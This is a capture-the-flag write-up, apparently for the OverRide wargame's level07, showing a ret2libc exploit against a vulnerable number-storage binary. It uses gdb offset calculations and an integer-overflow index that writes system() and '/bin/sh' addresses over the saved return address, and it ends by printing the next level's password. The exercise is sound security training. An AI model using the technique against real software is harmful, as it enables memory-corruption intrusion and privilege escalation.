@@ -1,0 +1,122 @@
+Running the binary we get :
+
+level07@OverRide:~$ ./level07 
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+ Commands:                                          
+    store - store a number into the data storage    
+    read  - read a number from the data storage     
+    quit  - exit the program                        
+----------------------------------------------------
+   wil has reserved some storage :>                 
+----------------------------------------------------
+
+It takes 2 user inputs, first one is a number to store in an array and the second one is the index of the array.
+
+Input command: store
+Number: 123
+Index: 4
+Completed store command successfully
+Input command: read
+Index: 4
+Number at data[4] is 123
+Completed read command successfully
+
+We can write and read from an array.
+
+Let's use a ret2libc in order to bypass this binary.
+
+First step is to find the index of the int(**) in order to find eip's offset.
+
+Breakpoint 1, 0x080486dd in read_number ()
+(gdb) x/x $ebp+0x8
+0xffffd510:     0xffffd534
+p/d 0xffffd534 - 0xffffd510
+$1 = 36
+
+We are dealing with an int so 36 / 4 = 9 and since we go from high address, it becomes -9.
+The index is -9.
+
+Second step is to find eip's offset.
+
+(gdb) b * 0x0804892b
+(gdb) r
+(gdb) c
+Breakpoint 2, 0x0804892b in main ()
+(gdb) i frame
+Stack level 0, frame at 0xffffd700:
+eip = 0x804892b in main; saved eip 0xf7e45513
+Arglist at 0xffffd6f8, args: 
+Locals at 0xffffd6f8, Previous frame's sp is 0xffffd700
+Saved registers:
+  ebx at 0xffffd6ec, ebp at 0xffffd6f8, esi at 0xffffd6f0, edi at 0xffffd6f4, eip at 0xffffd6fc
+
+eip is at 0xffffd6fc.
+
+(gdb) p/d 0xffffd6fc - 0xffffd534
+$1 = 456
+456/4 = 114
+
+114 is eip's offset.
+
+We can check :
+
+(gdb) r
+Input command: read
+Index: 114
+Number at data[114] is 4158936339
+Completed read command successfully
+
+4158936339 = 0xf7e45513
+
+(gdb) b read_number 
+Breakpoint 1 at 0x80486dd
+(gdb) b * 0x0804892b
+Breakpoint 2 at 0x804892b
+(gdb) r
+(gdb) x/x 0xffffd6fc
+0xffffd6fc:     0xf7e45513
+
+Thirdly, Let's find the address of system() in order to do our ret2libc.
+
+(gdb) i func system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xf7e6aed0  __libc_system
+0xf7e6aed0  system
+0xf7f48a50  svcerr_systemerr
+
+
+0xf7e6aed0 = 4159090384
+
+Since eip's index (114) can't be overwritten since it's protected, let's use an int overflow.
+4294967296 / 4 + 114 = 1073741938 where 4294967296 is the UINT_MAX value.
+
+Now that we can overwrite eip's address with the address of system(), let's find /bin/sh.
+(gdb) info proc map
+(gdb) find 0xf7e2c000, 0xf7ffe000, "/bin/sh"
+0xf7f897ec
+1 pattern found.
+
+0xf7f897ec = 4160264172
+
+So we will do :
+store system()'s address at index 114 : 4159090384  -> 1073741938
+store /bin/sh's address at index 116 : 4160264172 -> 116
+
+level07@OverRide:~$ ./level07
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$ whoami
+level08
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
